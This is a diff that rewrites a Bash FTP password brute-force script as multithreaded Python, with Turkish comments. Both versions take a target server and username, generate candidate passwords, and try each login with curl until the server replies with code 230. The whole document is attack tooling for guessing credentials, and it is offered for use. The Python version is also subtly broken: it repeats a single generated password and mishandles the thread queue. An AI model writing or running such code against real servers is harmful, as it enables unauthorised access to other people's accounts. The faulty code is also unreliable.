@@ -1,43 +1,58 @@
-#!/bin/bash
+import os
+import subprocess
+import threading
+import queue
 
 # Kullanıcıdan input al
-read -p "FTP Sunucusu: " SERVER
-read -p "Kullanıcı adı: " USER
+server = input("FTP Sunucusu: ")
+user = input("Kullanıcı adı: ")
 
 # Log dosyası
-LOG_FILE="bruteforce.log"
+log_file = "bruteforce.log"
 
 # Log dosyasını temizle
-> "$LOG_FILE"
+with open(log_file, 'w'):
+    pass
 
 # Rastgele parola oluşturma fonksiyonu
-generate_passwords() {
-  openssl rand -base64 10 | head -n 10000
-}
+def generate_passwords():
+    result = subprocess.run(['openssl', 'rand', '-base64', '10'], capture_output=True, text=True)
+    return [result.stdout.strip() for _ in range(10000)]
 
 # Parola listesini oluştur
-PASS_LIST="passwords.txt"
-generate_passwords > "$PASS_LIST"
+pass_list = generate_passwords()
+
+# Log işlemi
+def log_message(message):
+    print(message)
+    with open(log_file, 'a') as f:
+        f.write(message + "\n")
 
 # Paralel brute force saldırısı
-check_password() {
-  local PASS=$1
-  echo "Trying $USER:$PASS"
-  echo "Trying $USER:$PASS" >> "$LOG_FILE"
-  RESPONSE=$(curl -s --user "$USER:$PASS" "ftp://$SERVER" | grep "230")
-  if [ -n "$RESPONSE" ]; then
-    echo "Login successful: $USER:$PASS"
-    echo "Login successful: $USER:$PASS" >> "$LOG_FILE"
-    kill 0 # Tüm alt işlemleri sonlandır
-    exit 0
-  fi
-}
+def check_password(password, q):
+    log_message(f"Trying {user}:{password}")
+    response = subprocess.run(['curl', '-s', '--user', f"{user}:{password}", f"ftp://{server}"], capture_output=True, text=True)
+    if "230" in response.stdout:
+        log_message(f"Login successful: {user}:{password}")
+        os._exit(0)
+    q.task_done()
 
-export -f check_password
-export SERVER USER LOG_FILE
+# Parola listesi için kuyruk oluştur
+q = queue.Queue()
 
-xargs -P 10 -n 1 -I {} bash -c 'check_password "$@"' _ {} < "$PASS_LIST"
+# Parolaları kuyruğa ekle
+for password in pass_list:
+    q.put(password)
 
-echo "Brute force attack finished."
-echo "Brute force attack finished." >> "$LOG_FILE"
-exit 1
+# İş parçacıklarını başlat
+threads = []
+for _ in range(10):
+    t = threading.Thread(target=lambda q: q.put(check_password(q.get(), q)), args=(q,))
+    t.start()
+    threads.append(t)
+
+# Kuyruğun tamamlanmasını bekle
+q.join()
+
+log_message("Brute force attack finished.")
+exit(1)
